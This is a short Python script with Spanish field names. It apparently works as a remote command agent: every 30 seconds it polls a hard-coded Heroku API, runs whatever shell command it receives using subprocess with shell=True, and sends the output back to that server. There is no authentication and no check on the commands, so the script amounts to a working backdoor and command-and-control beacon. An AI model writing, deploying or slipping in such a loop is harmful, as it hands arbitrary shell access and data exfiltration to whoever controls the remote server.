import requests
import subprocess
import json
import time

api = 'https://desolate-cliffs-16906.herokuapp.com/api/'
body = {
  "name": "string",
  "plots": 0,
  "comando": "string",
  "respuesta": "string"
}

def getData(api, path):
    link = api + path 
    r = requests.get(link)
    if not r:
        print('nothing')
    r_formated = r.json()[-1]
    try:
        if r.json()[-1]['comando'] == r.json()[-2]['comando']:
            r_formated['respuesta'] = 'Ese comando ya fue ejecutado'
            return r_formated
    except :
        return r_formated
    return r_formated

def createBash():
    response = getData(api, 'get_comands_plots/')
    name = response['name']

    if response['respuesta'] == 'Ese comando ya fue ejecutado':
        put_response = requests.put(api + f'cancel_comand/{name}/', data=json.dumps(response))
        print(put_response.text)
        return put_response

    bash = subprocess.Popen(response["comando"], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
    out, err = bash.communicate()
    response["respuesta"] = out
    print(response)
    requests.put(api + f'cancel_comand/{name}/', data=json.dumps(response))

while True:
    createBash()
    time.sleep(30) 